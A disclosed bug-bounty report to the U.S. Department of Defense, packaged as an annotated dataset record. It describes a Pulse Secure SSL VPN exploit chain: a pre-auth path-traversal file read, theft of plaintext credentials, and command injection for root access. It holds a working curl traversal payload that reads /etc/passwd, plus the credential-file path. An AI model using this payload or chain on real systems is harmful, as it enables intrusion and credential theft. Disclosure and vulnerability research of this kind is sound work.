{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sp1d3rs ",
  "title": "Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███",
  "content": "\nDescription\nHello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:\nCVE-2019-11510 - Pre-auth Arbitrary File Reading\nCVE-2019-11542 - Post-auth Stack Buffer Overflow\nCVE-2019-11539 - Post-auth Command Injection\nCVE-2019-11538 - Post-auth Arbitrary File Reading\nCVE-2019-11508 - Post-auth Arbitrary File Writing\nCVE-2019-11540 - Post-auth Session Hijacking\nLink to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf\nI discovered that https://████ instance is vulnerable to described vulnerabilities.\nPOC\nExtracting /etc/passwd as example:\nCode 128 Bytes\n1curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/\n{F561180}\nThe RCE can be achieved with this chain:\n1) Pulse Secure stores credentials in the cleartext.\n2) Attacker reads credentials via CVE-2019-11510 (it stored in the /data/runtime/mtmp/lmdb/dataa/data.mdb) and authorizes on VPN\n3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.\nSuggested fix\nUpdate the Pulse Secure SSL VPN software (also implementing certificate validation can harden access a bit if some similar CVEs will be discovered in future).\nImpact\nRemote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1575334740,
  "report_url": "https://hackerone.com/reports/678496",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
    ],
    [
      2,
      "Read credentials from /data/runtime/mtmp/lmdb/dataa/data.mdb and authenticate to the VPN"
    ],
    [
      3,
      "Exploit CVE-2019-11539 to achieve RCE as root"
    ]
  ],
  "vuln_description": "The vulnerability involves a chain of exploits starting with an arbitrary file read (CVE-2019-11510) to retrieve plaintext credentials stored in the VPN system, followed by authentication and exploitation of a post-auth command injection (CVE-2019-11539) to achieve remote code execution as root.",
  "reason": "The attack involves multiple components: exploiting a pre-auth arbitrary file read to obtain credentials, authenticating to the VPN, and then exploiting a post-auth command injection. While the individual steps are documented in public vulnerabilities, chaining them together requires understanding the interaction between these components and the system's state.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves pre-auth arbitrary file reading (CVE-2019-11510) and post-auth command injection (CVE-2019-11539), which are not directly related to the IDOR or AuthN/AuthZ bypass methodologies described. The methodologies focus on swapping user sessions and resource IDs within the same application, whereas this vulnerability involves exploiting file system paths and command injection after authentication.",
    "is_detectable": false
  }
}